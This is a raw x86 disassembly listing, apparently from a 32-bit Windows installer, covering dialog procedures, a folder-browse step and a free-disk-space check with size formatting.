  40499c:	50                   	push   %eax
  40499d:	ff d6                	call   *%esi
  40499f:	8b 0f                	mov    (%edi),%ecx
  4049a1:	83 e0 01             	and    $0x1,%eax
  4049a4:	83 e1 fe             	and    $0xfffffffe,%ecx
  4049a7:	50                   	push   %eax
  4049a8:	0b c8                	or     %eax,%ecx
  4049aa:	89 0f                	mov    %ecx,(%edi)
  4049ac:	e8 cc fc ff ff       	call   0x40467d
  4049b1:	e8 ef 00 00 00       	call   0x404aa5
  4049b6:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  4049ba:	0f 85 c0 00 00 00    	jne    0x404a80
  4049c0:	68 e8 03 00 00       	push   $0x3e8
  4049c5:	ff 75 08             	push   0x8(%ebp)
  4049c8:	ff 15 3c 82 40 00    	call   *0x40823c
  4049ce:	8b 7d 14             	mov    0x14(%ebp),%edi
  4049d1:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  4049d8:	75 67                	jne    0x404a41
  4049da:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  4049e1:	75 5e                	jne    0x404a41
  4049e3:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  4049e6:	8b 57 18             	mov    0x18(%edi),%edx
  4049e9:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4049ec:	2b ca                	sub    %edx,%ecx
  4049ee:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  4049f4:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4049f7:	c7 45 fc 00 7a 42 00 	movl   $0x427a00,-0x4(%ebp)
  4049fe:	73 41                	jae    0x404a41
  404a00:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  404a03:	51                   	push   %ecx
  404a04:	53                   	push   %ebx
  404a05:	68 4b 04 00 00       	push   $0x44b
  404a0a:	50                   	push   %eax
  404a0b:	ff d6                	call   *%esi
  404a0d:	8b 3d c4 81 40 00    	mov    0x4081c4,%edi
  404a13:	68 02 7f 00 00       	push   $0x7f02
  404a18:	53                   	push   %ebx
  404a19:	ff d7                	call   *%edi
  404a1b:	50                   	push   %eax
  404a1c:	ff 15 c8 81 40 00    	call   *0x4081c8
  404a22:	6a 01                	push   $0x1
  404a24:	ff 75 fc             	push   -0x4(%ebp)
  404a27:	ff 75 08             	push   0x8(%ebp)
  404a2a:	e8 9a 00 00 00       	call   0x404ac9
  404a2f:	68 00 7f 00 00       	push   $0x7f00
  404a34:	53                   	push   %ebx
  404a35:	ff d7                	call   *%edi
  404a37:	50                   	push   %eax
  404a38:	ff 15 c8 81 40 00    	call   *0x4081c8
  404a3e:	8b 7d 14             	mov    0x14(%ebp),%edi
  404a41:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  404a48:	75 48                	jne    0x404a92
  404a4a:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  404a51:	75 3f                	jne    0x404a92
  404a53:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  404a57:	75 10                	jne    0x404a69
  404a59:	53                   	push   %ebx
  404a5a:	6a 01                	push   $0x1
  404a5c:	68 11 01 00 00       	push   $0x111
  404a61:	ff 35 68 9a 42 00    	push   0x429a68
  404a67:	ff d6                	call   *%esi
  404a69:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  404a6d:	75 0c                	jne    0x404a7b
  404a6f:	53                   	push   %ebx
  404a70:	53                   	push   %ebx
  404a71:	6a 10                	push   $0x10
  404a73:	ff 35 68 9a 42 00    	push   0x429a68
  404a79:	ff d6                	call   *%esi
  404a7b:	33 c0                	xor    %eax,%eax
  404a7d:	40                   	inc    %eax
  404a7e:	eb 1e                	jmp    0x404a9e
  404a80:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404a87:	75 06                	jne    0x404a8f
  404a89:	ff 05 1c 0f 42 00    	incl   0x420f1c
  404a8f:	8b 7d 14             	mov    0x14(%ebp),%edi
  404a92:	57                   	push   %edi
  404a93:	ff 75 10             	push   0x10(%ebp)
  404a96:	ff 75 0c             	push   0xc(%ebp)
  404a99:	e8 24 fc ff ff       	call   0x4046c2
  404a9e:	5f                   	pop    %edi
  404a9f:	5e                   	pop    %esi
  404aa0:	5b                   	pop    %ebx
  404aa1:	c9                   	leave
  404aa2:	c2 10 00             	ret    $0x10
  404aa5:	83 3d ec 9a 42 00 00 	cmpl   $0x0,0x429aec
  404aac:	a1 18 0f 42 00       	mov    0x420f18,%eax
  404ab1:	75 05                	jne    0x404ab8
  404ab3:	a1 4c 2f 42 00       	mov    0x422f4c,%eax
  404ab8:	6a 01                	push   $0x1
  404aba:	6a 01                	push   $0x1
  404abc:	68 f4 00 00 00       	push   $0xf4
  404ac1:	50                   	push   %eax
  404ac2:	ff 15 58 82 40 00    	call   *0x408258
  404ac8:	c3                   	ret
  404ac9:	55                   	push   %ebp
  404aca:	8b ec                	mov    %esp,%ebp
  404acc:	83 ec 3c             	sub    $0x3c,%esp
  404acf:	8b 45 08             	mov    0x8(%ebp),%eax
  404ad2:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  404ad6:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  404ada:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404add:	8b 45 0c             	mov    0xc(%ebp),%eax
  404ae0:	c7 45 c8 00 05 00 00 	movl   $0x500,-0x38(%ebp)
  404ae7:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404aea:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  404aed:	50                   	push   %eax
  404aee:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  404af5:	c7 45 d0 bc a3 40 00 	movl   $0x40a3bc,-0x30(%ebp)
  404afc:	e8 01 12 00 00       	call   0x405d02
  404b01:	c9                   	leave
  404b02:	c2 0c 00             	ret    $0xc
  404b05:	55                   	push   %ebp
  404b06:	8b ec                	mov    %esp,%ebp
  404b08:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404b0f:	56                   	push   %esi
  404b10:	8b 75 14             	mov    0x14(%ebp),%esi
  404b13:	75 26                	jne    0x404b3b
  404b15:	ff 76 30             	push   0x30(%esi)
  404b18:	6a 1d                	push   $0x1d
  404b1a:	ff 75 08             	push   0x8(%ebp)
  404b1d:	e8 39 fb ff ff       	call   0x40465b
  404b22:	8b 46 3c             	mov    0x3c(%esi),%eax
  404b25:	c1 e0 0b             	shl    $0xb,%eax
  404b28:	05 00 a0 42 00       	add    $0x42a000,%eax
  404b2d:	50                   	push   %eax
  404b2e:	68 e8 03 00 00       	push   $0x3e8
  404b33:	ff 75 08             	push   0x8(%ebp)
  404b36:	e8 df 11 00 00       	call   0x405d1a
  404b3b:	56                   	push   %esi
  404b3c:	ff 75 10             	push   0x10(%ebp)
  404b3f:	ff 75 0c             	push   0xc(%ebp)
  404b42:	e8 7b fb ff ff       	call   0x4046c2
  404b47:	5e                   	pop    %esi
  404b48:	5d                   	pop    %ebp
  404b49:	c2 10 00             	ret    $0x10
  404b4c:	55                   	push   %ebp
  404b4d:	8b ec                	mov    %esp,%ebp
  404b4f:	83 ec 4c             	sub    $0x4c,%esp
  404b52:	a1 28 1f 42 00       	mov    0x421f28,%eax
  404b57:	53                   	push   %ebx
  404b58:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404b5b:	56                   	push   %esi
  404b5c:	8b 58 3c             	mov    0x3c(%eax),%ebx
  404b5f:	8b 40 38             	mov    0x38(%eax),%eax
  404b62:	c1 e3 0b             	shl    $0xb,%ebx
  404b65:	81 c3 00 a0 42 00    	add    $0x42a000,%ebx
  404b6b:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404b72:	57                   	push   %edi
  404b73:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404b76:	75 11                	jne    0x404b89
  404b78:	53                   	push   %ebx
  404b79:	68 fb 03 00 00       	push   $0x3fb
  404b7e:	e8 9d 11 00 00       	call   0x405d20
  404b83:	53                   	push   %ebx
  404b84:	e8 01 1e 00 00       	call   0x40698a
  404b89:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404b90:	8b 75 08             	mov    0x8(%ebp),%esi
  404b93:	75 6c                	jne    0x404c01
  404b95:	68 fb 03 00 00       	push   $0x3fb
  404b9a:	56                   	push   %esi
  404b9b:	ff 15 3c 82 40 00    	call   *0x40823c
  404ba1:	53                   	push   %ebx
  404ba2:	8b f8                	mov    %eax,%edi
  404ba4:	e8 79 14 00 00       	call   0x406022
  404ba9:	85 c0                	test   %eax,%eax
  404bab:	74 10                	je     0x404bbd
  404bad:	53                   	push   %ebx
  404bae:	e8 a3 14 00 00       	call   0x406056
  404bb3:	85 c0                	test   %eax,%eax
  404bb5:	75 06                	jne    0x404bbd
  404bb7:	53                   	push   %ebx
  404bb8:	e8 ee 13 00 00       	call   0x405fab
  404bbd:	53                   	push   %ebx
  404bbe:	57                   	push   %edi
  404bbf:	89 35 38 8a 42 00    	mov    %esi,0x428a38
  404bc5:	ff 15 1c 82 40 00    	call   *0x40821c
  404bcb:	8b 45 14             	mov    0x14(%ebp),%eax
  404bce:	ff 70 34             	push   0x34(%eax)
  404bd1:	6a 01                	push   $0x1
  404bd3:	56                   	push   %esi
  404bd4:	e8 82 fa ff ff       	call   0x40465b
  404bd9:	8b 45 14             	mov    0x14(%ebp),%eax
  404bdc:	ff 70 30             	push   0x30(%eax)
  404bdf:	6a 14                	push   $0x14
  404be1:	56                   	push   %esi
  404be2:	e8 74 fa ff ff       	call   0x40465b
  404be7:	57                   	push   %edi
  404be8:	e8 a3 fa ff ff       	call   0x404690
  404bed:	6a 09                	push   $0x9
  404bef:	e8 dc 1e 00 00       	call   0x406ad0
  404bf4:	85 c0                	test   %eax,%eax
  404bf6:	0f 84 91 02 00 00    	je     0x404e8d
  404bfc:	6a 01                	push   $0x1
  404bfe:	57                   	push   %edi
  404bff:	ff d0                	call   *%eax
  404c01:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404c08:	0f 85 d1 00 00 00    	jne    0x404cdf
  404c0e:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  404c12:	3d fb 03 00 00       	cmp    $0x3fb,%eax
  404c17:	75 18                	jne    0x404c31
  404c19:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404c1c:	c1 e9 10             	shr    $0x10,%ecx
  404c1f:	66 81 f9 00 03       	cmp    $0x300,%cx
  404c24:	0f 85 63 02 00 00    	jne    0x404e8d
  404c2a:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404c31:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  404c36:	0f 85 a3 00 00 00    	jne    0x404cdf
  404c3c:	6a 07                	push   $0x7
  404c3e:	33 c0                	xor    %eax,%eax
  404c40:	59                   	pop    %ecx
  404c41:	8d 7d b8             	lea    -0x48(%ebp),%edi
  404c44:	ff 75 f8             	push   -0x8(%ebp)
  404c47:	f3 ab                	rep stos %eax,%es:(%edi)
  404c49:	bf 50 2f 42 00       	mov    $0x422f50,%edi
  404c4e:	68 28 17 42 00       	push   $0x421728
  404c53:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  404c56:	89 7d bc             	mov    %edi,-0x44(%ebp)
  404c59:	c7 45 c8 a2 4e 40 00 	movl   $0x404ea2,-0x38(%ebp)
  404c60:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  404c63:	e8 b1 1a 00 00       	call   0x406719
  404c68:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404c6b:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404c6e:	50                   	push   %eax
  404c6f:	c7 45 c4 41 00 00 00 	movl   $0x41,-0x3c(%ebp)
  404c76:	ff 15 78 81 40 00    	call   *0x408178
  404c7c:	85 c0                	test   %eax,%eax
  404c7e:	74 58                	je     0x404cd8
  404c80:	50                   	push   %eax
  404c81:	ff 15 a0 82 40 00    	call   *0x4082a0
  404c87:	53                   	push   %ebx
  404c88:	e8 1e 13 00 00       	call   0x405fab
  404c8d:	a1 70 9a 42 00       	mov    0x429a70,%eax
  404c92:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  404c98:	85 c0                	test   %eax,%eax
  404c9a:	74 28                	je     0x404cc4
  404c9c:	81 fb 00 48 43 00    	cmp    $0x434800,%ebx
  404ca2:	75 20                	jne    0x404cc4
  404ca4:	50                   	push   %eax
  404ca5:	6a 00                	push   $0x0
  404ca7:	e8 6d 1a 00 00       	call   0x406719
  404cac:	57                   	push   %edi
  404cad:	bf 00 7a 42 00       	mov    $0x427a00,%edi
  404cb2:	57                   	push   %edi
  404cb3:	ff 15 00 81 40 00    	call   *0x408100
  404cb9:	85 c0                	test   %eax,%eax
  404cbb:	74 07                	je     0x404cc4
  404cbd:	57                   	push   %edi
  404cbe:	53                   	push   %ebx
  404cbf:	e8 34 1a 00 00       	call   0x4066f8
  404cc4:	ff 05 40 2f 42 00    	incl   0x422f40
  404cca:	53                   	push   %ebx
  404ccb:	68 fb 03 00 00       	push   $0x3fb
  404cd0:	56                   	push   %esi
  404cd1:	e8 44 10 00 00       	call   0x405d1a
  404cd6:	eb 07                	jmp    0x404cdf
  404cd8:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404cdf:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404ce6:	74 0d                	je     0x404cf5
  404ce8:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404cef:	0f 85 98 01 00 00    	jne    0x404e8d
  404cf5:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404cf9:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404cfd:	53                   	push   %ebx
  404cfe:	68 fb 03 00 00       	push   $0x3fb
  404d03:	e8 18 10 00 00       	call   0x405d20
  404d08:	53                   	push   %ebx
  404d09:	e8 a5 13 00 00       	call   0x4060b3
  404d0e:	85 c0                	test   %eax,%eax
  404d10:	75 07                	jne    0x404d19
  404d12:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  404d19:	be 20 0f 42 00       	mov    $0x420f20,%esi
  404d1e:	53                   	push   %ebx
  404d1f:	56                   	push   %esi
  404d20:	e8 b7 19 00 00       	call   0x4066dc
  404d25:	6a 01                	push   $0x1
  404d27:	e8 a4 1d 00 00       	call   0x406ad0
  404d2c:	85 c0                	test   %eax,%eax
  404d2e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404d31:	74 3a                	je     0x404d6d
  404d33:	33 c0                	xor    %eax,%eax
  404d35:	33 ff                	xor    %edi,%edi
  404d37:	3b c6                	cmp    %esi,%eax
  404d39:	74 32                	je     0x404d6d
  404d3b:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404d3e:	50                   	push   %eax
  404d3f:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404d42:	50                   	push   %eax
  404d43:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404d46:	50                   	push   %eax
  404d47:	56                   	push   %esi
  404d48:	ff 55 f4             	call   *-0xc(%ebp)
  404d4b:	85 c0                	test   %eax,%eax
  404d4d:	75 76                	jne    0x404dc5
  404d4f:	85 ff                	test   %edi,%edi
  404d51:	74 03                	je     0x404d56
  404d53:	66 21 07             	and    %ax,(%edi)
  404d56:	56                   	push   %esi
  404d57:	e8 9b 12 00 00       	call   0x405ff7
  404d5c:	8b f8                	mov    %eax,%edi
  404d5e:	66 83 27 00          	andw   $0x0,(%edi)
  404d62:	4f                   	dec    %edi
  404d63:	4f                   	dec    %edi
  404d64:	3b fe                	cmp    %esi,%edi
  404d66:	66 c7 07 5c 00       	movw   $0x5c,(%edi)
  404d6b:	75 ce                	jne    0x404d3b
  404d6d:	53                   	push   %ebx
  404d6e:	56                   	push   %esi
  404d6f:	e8 68 19 00 00       	call   0x4066dc
  404d74:	56                   	push   %esi
  404d75:	e8 dc 12 00 00       	call   0x406056
  404d7a:	33 ff                	xor    %edi,%edi
  404d7c:	3b c7                	cmp    %edi,%eax
  404d7e:	74 03                	je     0x404d83
  404d80:	66 89 38             	mov    %di,(%eax)
  404d83:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404d86:	50                   	push   %eax
  404d87:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404d8a:	50                   	push   %eax
  404d8b:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404d8e:	50                   	push   %eax
  404d8f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404d92:	50                   	push   %eax
  404d93:	56                   	push   %esi
  404d94:	ff 15 8c 80 40 00    	call   *0x40808c
  404d9a:	85 c0                	test   %eax,%eax
  404d9c:	74 43                	je     0x404de1
  404d9e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404da1:	be 00 04 00 00       	mov    $0x400,%esi
  404da6:	0f af 45 ec          	imul   -0x14(%ebp),%eax
  404daa:	56                   	push   %esi
  404dab:	ff 75 f4             	push   -0xc(%ebp)
  404dae:	50                   	push   %eax
  404daf:	ff 15 48 81 40 00    	call   *0x408148
  404db5:	99                   	cltd
  404db6:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404db9:	89 55 d8             	mov    %edx,-0x28(%ebp)
  404dbc:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404dc3:	eb 21                	jmp    0x404de6
  404dc5:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404dc8:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  404dcb:	0f ac c8 0a          	shrd   $0xa,%ecx,%eax
  404dcf:	c1 e9 0a             	shr    $0xa,%ecx
  404dd2:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404dd5:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  404dd8:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404ddf:	33 ff                	xor    %edi,%edi
  404de1:	be 00 04 00 00       	mov    $0x400,%esi
  404de6:	6a 05                	push   $0x5
  404de8:	e8 fc 01 00 00       	call   0x404fe9
  404ded:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404df0:	74 19                	je     0x404e0b
  404df2:	8b 55 d8             	mov    -0x28(%ebp),%edx
  404df5:	33 c9                	xor    %ecx,%ecx
  404df7:	3b d1                	cmp    %ecx,%edx
  404df9:	77 10                	ja     0x404e0b
  404dfb:	72 07                	jb     0x404e04
  404dfd:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  404e00:	3b c8                	cmp    %eax,%ecx
  404e02:	73 07                	jae    0x404e0b
  404e04:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  404e0b:	8b 0d 3c 8a 42 00    	mov    0x428a3c,%ecx
  404e11:	39 79 10             	cmp    %edi,0x10(%ecx)
  404e14:	74 30                	je     0x404e46
  404e16:	50                   	push   %eax
  404e17:	6a fb                	push   $0xfffffffb
  404e19:	68 ff 03 00 00       	push   $0x3ff
  404e1e:	e8 ae 01 00 00       	call   0x404fd1
  404e23:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404e26:	74 10                	je     0x404e38
  404e28:	ff 75 d8             	push   -0x28(%ebp)
  404e2b:	ff 75 d4             	push   -0x2c(%ebp)
  404e2e:	6a fc                	push   $0xfffffffc
  404e30:	56                   	push   %esi
  404e31:	e8 d2 00 00 00       	call   0x404f08
  404e36:	eb 0e                	jmp    0x404e46
  404e38:	68 0c 0f 42 00       	push   $0x420f0c
  404e3d:	56                   	push   %esi
  404e3e:	ff 75 08             	push   0x8(%ebp)
  404e41:	e8 d4 0e 00 00       	call   0x405d1a
  404e46:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404e49:	3b c7                	cmp    %edi,%eax
  404e4b:	a3 04 9b 42 00       	mov    %eax,0x429b04
  404e50:	75 0a                	jne    0x404e5c
  404e52:	6a 07                	push   $0x7
  404e54:	e8 b2 c5 ff ff       	call   0x40140b
  404e59:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404e5c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404e5f:	85 70 14             	test   %esi,0x14(%eax)
  404e62:	74 03                	je     0x404e67
  404e64:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404e67:	33 c0                	xor    %eax,%eax
  404e69:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404e6c:	0f 94 c0             	sete   %al
  404e6f:	50                   	push   %eax
  404e70:	e8 08 f8 ff ff       	call   0x40467d
  404e75:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404e78:	75 0d                	jne    0x404e87
  404e7a:	39 3d 40 2f 42 00    	cmp    %edi,0x422f40
  404e80:	75 05                	jne    0x404e87
  404e82:	e8 1e fc ff ff       	call   0x404aa5
  404e87:	89 3d 40 2f 42 00    	mov    %edi,0x422f40
  404e8d:	ff 75 14             	push   0x14(%ebp)
  404e90:	ff 75 10             	push   0x10(%ebp)
  404e93:	ff 75 0c             	push   0xc(%ebp)
  404e96:	e8 27 f8 ff ff       	call   0x4046c2
  404e9b:	5f                   	pop    %edi
  404e9c:	5e                   	pop    %esi
  404e9d:	5b                   	pop    %ebx
  404e9e:	c9                   	leave
  404e9f:	c2 10 00             	ret    $0x10
  404ea2:	55                   	push   %ebp
  404ea3:	8b ec                	mov    %esp,%ebp
  404ea5:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  404ea9:	56                   	push   %esi
  404eaa:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404eb0:	75 1c                	jne    0x404ece
  404eb2:	ff 75 14             	push   0x14(%ebp)
  404eb5:	68 fb 03 00 00       	push   $0x3fb
  404eba:	e8 61 0e 00 00       	call   0x405d20
  404ebf:	ff 75 14             	push   0x14(%ebp)
  404ec2:	6a 01                	push   $0x1
  404ec4:	68 67 04 00 00       	push   $0x467
  404ec9:	ff 75 08             	push   0x8(%ebp)
  404ecc:	ff d6                	call   *%esi
  404ece:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  404ed2:	75 2d                	jne    0x404f01
  404ed4:	ff 75 14             	push   0x14(%ebp)
  404ed7:	ff 75 10             	push   0x10(%ebp)
  404eda:	ff 15 74 81 40 00    	call   *0x408174
  404ee0:	85 c0                	test   %eax,%eax
  404ee2:	74 0e                	je     0x404ef2
  404ee4:	6a 07                	push   $0x7
  404ee6:	e8 20 c5 ff ff       	call   0x40140b
  404eeb:	85 c0                	test   %eax,%eax
  404eed:	75 03                	jne    0x404ef2
  404eef:	40                   	inc    %eax
  404ef0:	eb 02                	jmp    0x404ef4
  404ef2:	33 c0                	xor    %eax,%eax
  404ef4:	50                   	push   %eax
  404ef5:	6a 00                	push   $0x0
  404ef7:	68 65 04 00 00       	push   $0x465
  404efc:	ff 75 08             	push   0x8(%ebp)
  404eff:	ff d6                	call   *%esi
  404f01:	33 c0                	xor    %eax,%eax
  404f03:	5e                   	pop    %esi
  404f04:	5d                   	pop    %ebp
  404f05:	c2 10 00             	ret    $0x10
  404f08:	55                   	push   %ebp
  404f09:	8b ec                	mov    %esp,%ebp
  404f0b:	81 ec 80 00 00 00    	sub    $0x80,%esp
  404f11:	8b 45 14             	mov    0x14(%ebp),%eax
  404f14:	53                   	push   %ebx
  404f15:	56                   	push   %esi
  404f16:	8b 75 10             	mov    0x10(%ebp),%esi
  404f19:	57                   	push   %edi
  404f1a:	6a dc                	push   $0xffffffdc
  404f1c:	85 c0                	test   %eax,%eax
  404f1e:	5b                   	pop    %ebx
  404f1f:	74 0b                	je     0x404f2c
  404f21:	0f ac c6 14          	shrd   $0x14,%eax,%esi
  404f25:	c1 e8 14             	shr    $0x14,%eax
  404f28:	33 ff                	xor    %edi,%edi
  404f2a:	eb 4e                	jmp    0x404f7a
  404f2c:	6a 14                	push   $0x14
  404f2e:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  404f34:	59                   	pop    %ecx
  404f35:	8b c6                	mov    %esi,%eax
  404f37:	73 06                	jae    0x404f3f
  404f39:	6a 0a                	push   $0xa
  404f3b:	59                   	pop    %ecx
  404f3c:	6a dd                	push   $0xffffffdd
  404f3e:	5b                   	pop    %ebx
  404f3f:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  404f45:	73 05                	jae    0x404f4c
  404f47:	6a de                	push   $0xffffffde
  404f49:	33 c9                	xor    %ecx,%ecx
  404f4b:	5b                   	pop    %ebx
  404f4c:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  404f52:	73 0d                	jae    0x404f61
  404f54:	33 c0                	xor    %eax,%eax
  404f56:	6a 14                	push   $0x14
  404f58:	40                   	inc    %eax
  404f59:	5f                   	pop    %edi
  404f5a:	d3 e0                	shl    %cl,%eax
  404f5c:	99                   	cltd
  404f5d:	f7 ff                	idiv   %edi
  404f5f:	03 c6                	add    %esi,%eax
  404f61:	8b f0                	mov    %eax,%esi
  404f63:	25 ff ff ff 00       	and    $0xffffff,%eax
  404f68:	6a 0a                	push   $0xa
  404f6a:	33 d2                	xor    %edx,%edx
  404f6c:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404f6f:	03 c0                	add    %eax,%eax
  404f71:	d3 e8                	shr    %cl,%eax
  404f73:	d3 ee                	shr    %cl,%esi
  404f75:	59                   	pop    %ecx
  404f76:	f7 f1                	div    %ecx
  404f78:	8b fa                	mov    %edx,%edi
  404f7a:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404f7d:	6a df                	push   $0xffffffdf
  404f7f:	50                   	push   %eax
  404f80:	e8 94 17 00 00       	call   0x406719
  404f85:	50                   	push   %eax
  404f86:	8d 45 80             	lea    -0x80(%ebp),%eax
  404f89:	53                   	push   %ebx
  404f8a:	50                   	push   %eax
  404f8b:	e8 89 17 00 00       	call   0x406719
  404f90:	50                   	push   %eax
  404f91:	57                   	push   %edi
  404f92:	56                   	push   %esi
  404f93:	68 c8 a3 40 00       	push   $0x40a3c8
  404f98:	ff 75 0c             	push   0xc(%ebp)
  404f9b:	be 50 2f 42 00       	mov    $0x422f50,%esi
  404fa0:	56                   	push   %esi
  404fa1:	e8 73 17 00 00       	call   0x406719
  404fa6:	56                   	push   %esi
  404fa7:	8b f8                	mov    %eax,%edi
  404fa9:	e8 44 17 00 00       	call   0x4066f2
  404fae:	8d 04 47             	lea    (%edi,%eax,2),%eax
  404fb1:	50                   	push   %eax
  404fb2:	ff 15 2c 82 40 00    	call   *0x40822c
  404fb8:	83 c4 18             	add    $0x18,%esp
  404fbb:	56                   	push   %esi
  404fbc:	ff 75 08             	push   0x8(%ebp)
  404fbf:	ff 35 38 8a 42 00    	push   0x428a38
  404fc5:	e8 50 0d 00 00       	call   0x405d1a
  404fca:	5f                   	pop    %edi
  404fcb:	5e                   	pop    %esi
  404fcc:	5b                   	pop    %ebx
  404fcd:	c9                   	leave
  404fce:	c2 10 00             	ret    $0x10
  404fd1:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404fd5:	33 c9                	xor    %ecx,%ecx
  404fd7:	51                   	push   %ecx
  404fd8:	50                   	push   %eax
  404fd9:	ff 74 24 10          	push   0x10(%esp)
  404fdd:	ff 74 24 10          	push   0x10(%esp)
  404fe1:	e8 22 ff ff ff       	call   0x404f08
  404fe6:	c2 0c 00             	ret    $0xc
  404fe9:	8b 15 8c 9a 42 00    	mov    0x429a8c,%edx
  404fef:	8b 0d 88 9a 42 00    	mov    0x429a88,%ecx
  404ff5:	33 c0                	xor    %eax,%eax
  404ff7:	85 d2                	test   %edx,%edx
  404ff9:	74 18                	je     0x405013
  404ffb:	56                   	push   %esi
  404ffc:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  405000:	74 07                	je     0x405009
  405002:	8b 74 24 08          	mov    0x8(%esp),%esi
  405006:	03 04 b1             	add    (%ecx,%esi,4),%eax
  405009:	81 c1 18 08 00 00    	add    $0x818,%ecx
  40500f:	4a                   	dec    %edx
  405010:	75 ea                	jne    0x404ffc
  405012:	5e                   	pop    %esi
  405013:	c2 04 00             	ret    $0x4
  405016:	55                   	push   %ebp
  405017:	8b ec                	mov    %esp,%ebp
  405019:	83 ec 38             	sub    $0x38,%esp
  40501c:	56                   	push   %esi
  40501d:	8b 35 58 82 40 00    	mov    0x408258,%esi
  405023:	57                   	push   %edi
  405024:	8b 7d 08             	mov    0x8(%ebp),%edi
  405027:	6a 00                	push   $0x0
  405029:	6a 09                	push   $0x9
  40502b:	68 0a 11 00 00       	push   $0x110a
  405030:	57                   	push   %edi
  405031:	ff d6                	call   *%esi
  405033:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  405037:	74 3c                	je     0x405075
  405039:	ff 15 bc 81 40 00    	call   *0x4081bc
  40503f:	0f bf c8             	movswl %ax,%ecx
  405042:	c1 e8 10             	shr    $0x10,%eax
  405045:	0f bf c0             	movswl %ax,%eax
  405048:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40504b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40504e:	50                   	push   %eax
  40504f:	57                   	push   %edi
  405050:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  405053:	ff 15 ec 81 40 00    	call   *0x4081ec
  405059:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40505c:	50                   	push   %eax
  40505d:	6a 00                	push   $0x0
  40505f:	68 11 11 00 00       	push   $0x1111
  405064:	57                   	push   %edi
  405065:	ff d6                	call   *%esi
  405067:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  40506b:	75 05                	jne    0x405072
  40506d:	83 c8 ff             	or     $0xffffffff,%eax
  405070:	eb 1e                	jmp    0x405090
  405072:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405075:	89 45 cc             	mov    %eax,-0x34(%ebp)
